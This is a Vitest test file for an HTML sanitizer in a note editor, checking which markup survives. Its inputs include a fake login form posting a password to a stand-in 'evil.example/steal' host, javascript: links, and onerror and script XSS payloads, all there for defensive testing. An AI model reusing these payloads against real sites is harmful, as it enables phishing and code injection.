/**
 * sanitizeHtml — ONIX M-002: the renderer/editor allow-list keeps exactly the editor's own
 * markup and drops everything a stored note could use to impersonate the app (forms,
 * inputs, buttons, classes, style blocks, positioning CSS) or to run code.
 */
import { describe, it, expect } from 'vitest'
import { sanitizeHtml } from './sanitizeHtml'

describe('sanitizeHtml · the editor\'s own output survives byte-for-byte', () => {
  it('keeps paragraphs, headings, marks, code, quotes, lists, rules and text-align', () => {
    const html = '<p style="text-align: center">x</p><h2>t</h2><ul><li><strong>a</strong> <em>b</em> <s>c</s> <u>d</u> <code>e</code></li></ul>'
      + '<ol><li>n</li></ol><pre><code>f</code></pre><blockquote><p>g</p></blockquote><hr><p>h<br>i</p>'
    expect(sanitizeHtml(html)).toBe(html)
  })

  it('keeps an http(s)/mailto link, forcing a safe rel', () => {
    const out = sanitizeHtml('<p><a href="https://koios.example/x" target="_blank" rel="noopener noreferrer nofollow">l</a> <a href="mailto:a@b.nl">m</a></p>')
    expect(out).toContain('href="https://koios.example/x"')
    expect(out).toContain('target="_blank"')
    expect(out).toContain('rel="noopener noreferrer"')
    expect(out).toContain('href="mailto:a@b.nl"')
  })
})

describe('sanitizeHtml · a fake login screen cannot be built from a note', () => {
  it('drops form, input and button elements but keeps their text', () => {
    const out = sanitizeHtml('<form action="https://evil.example/steal" method="post"><p>Sessie verlopen</p><input name="password"><button>Inloggen</button></form>')
    expect(out).not.toMatch(/<form|<input|<button/)
    expect(out).toContain('Sessie verlopen')
    expect(out).toContain('Inloggen')
  })

  it('drops class, id and data-* attributes (no borrowing the app\'s own CSS or hooks)', () => {
    const out = sanitizeHtml('<p class="km-modal" id="login" data-role="dialog">x</p>')
    expect(out).toBe('<p>x</p>')
  })

  it('drops a <style> block together with its CSS text', () => {
    const out = sanitizeHtml('<style>body{display:none}</style><p>ok</p>')
    expect(out).toBe('<p>ok</p>')
  })

  it('keeps only text-align inside a style attribute and drops positioning/background CSS', () => {
    expect(sanitizeHtml('<p style="position:fixed;inset:0;background:#fff;text-align:center">x</p>')).toBe('<p style="text-align: center">x</p>')
    expect(sanitizeHtml('<p style="position:fixed;inset:0">x</p>')).toBe('<p>x</p>')
    expect(sanitizeHtml('<p style="text-align: diagonal">x</p>')).toBe('<p>x</p>')
  })

  it('drops javascript:, data: and relative hrefs (the link text stays) and a non-_blank target', () => {
    expect(sanitizeHtml('<a href="javascript:alert(1)">j</a>')).toBe('<a>j</a>')
    expect(sanitizeHtml('<a href="data:text/html,x">d</a>')).toBe('<a>d</a>')
    expect(sanitizeHtml('<a href="/login">r</a>')).toBe('<a>r</a>')
    expect(sanitizeHtml('<a href="https://x.y" target="_top">t</a>')).toBe('<a href="https://x.y" rel="noopener noreferrer">t</a>')
  })

  it('still strips scripts and inline handlers, and renders null as empty', () => {
    const out = sanitizeHtml('<img src=x onerror="alert(1)"><script>alert(2)</script>veilig')
    expect(out).toBe('veilig')
    expect(sanitizeHtml(null)).toBe('')
  })
})
